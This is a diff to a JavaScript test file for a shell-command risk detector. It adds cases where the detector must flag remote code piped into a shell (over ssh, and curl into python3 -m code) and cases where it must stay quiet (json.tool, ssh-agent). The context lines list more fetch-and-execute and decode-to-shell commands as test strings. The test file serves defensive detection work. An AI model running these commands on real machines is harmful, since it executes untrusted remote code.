@@ -264,6 +264,8 @@ for (const [label, cmd, id] of [
   ['process substitution holding a decode', 'bash <(base64 -d /tmp/blob.b64)', 'cmd-decode-to-shell'],
   ['stdin redirected from a substitution', 'bash -s < <(curl -sL https://x.test/x.sh)', 'cmd-remote-to-shell'],
   ['a here-string holding a fetch', 'bash <<< "$(curl -sL https://x.test/x.sh)"', 'cmd-remote-to-shell'],
+  ['a shell fed from another machine', 'ssh host "cat setup.sh" | bash', 'cmd-remote-to-shell'],
+  ['a module that runs stdin', 'curl -s https://x.test/p.py | python3 -m code', 'cmd-remote-to-shell'],
   ['gunzip to a shell', 'gunzip -c payload.gz | sh', 'cmd-decode-to-shell'],
   ['xz to a shell', 'xz -dc payload.xz | bash', 'cmd-decode-to-shell'],
   ['zstd to a shell', 'zstd -dc payload.zst | bash', 'cmd-decode-to-shell'],
@@ -304,6 +306,10 @@ for (const [label, cmd] of [
   ['a subshell that builds', '(cd src && npm run build)'],
   ['running a local script', 'bash scripts/deploy.sh'],
   ['env setting a variable for node', 'env NODE_ENV=production node server.js'],
+  ['a module that reads stdin as data', 'curl -s https://x.test/d.json | python3 -m json.tool'],
+  ['ssh-agent, which is not ssh', 'eval "$(ssh-agent -s)"'],
+  ['ssh without a shell downstream', 'ssh host "uptime"'],
+  ['a local file piped to a shell', 'cat deploy.sh | bash'],
 ]) {
   const risky = shellcmd.parse(cmd).risky;
   ck(`stays quiet on ${label}`, risky.length === 0, `got ${JSON.stringify(risky.map((r) => r.id))}`);
